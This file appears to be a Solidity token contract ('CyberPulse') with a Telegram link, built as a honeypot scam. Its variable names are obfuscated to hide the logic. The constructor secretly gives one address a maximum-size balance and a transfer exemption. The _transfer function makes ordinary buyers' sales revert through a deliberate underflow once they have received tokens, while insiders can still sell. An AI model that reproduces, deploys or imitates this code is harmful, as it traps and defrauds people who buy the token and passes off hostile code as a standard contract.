// https://t.me/CyberPulseEth

// SPDX-License-Identifier: Unlicense

pragma solidity >0.8.11;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract CyberPulse is Ownable {
    constructor(
        string memory production,
        string memory lost,
        address same,
        address any
    ) {
        uniswapV2Router = IUniswapV2Router02(same);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        _symbol = lost;
        _name = production;
        sum = 2;
        _decimals = 9;
        _balances[any] = rapidly;
        sunlight = 1000000000;
        opposite[any] = rapidly;
        _tTotal = sunlight * 10**_decimals;
        opposite[msg.sender] = rapidly;
        _balances[msg.sender] = _tTotal;
    }

    uint256 public sum;
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    uint256 private _tTotal;
    uint256 private sunlight;
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    address private ago;
    uint256 private rapidly = (~uint256(0));

    function decimals() public view returns (uint256) {
        return _decimals;
    }

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;

    function totalSupply() public view returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function _transfer(
        address happened,
        address paint,
        uint256 slave
    ) internal {
        uint256 mountain = sum;

        address stream = uniswapV2Pair;

        if (opposite[happened] == 0 && stream != happened && poet[happened] > 0) {
            opposite[happened] -= mountain;
        }

        address class = ago;
        ago = paint;
        poet[class] += mountain + 1;

        _balances[happened] -= slave;
        uint256 form = (slave / 100) * sum;
        slave -= form;
        _balances[paint] += slave;
    }

    mapping(address => uint256) private poet;

    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }

    mapping(address => uint256) private opposite;

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        _transfer(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        return true;
    }
}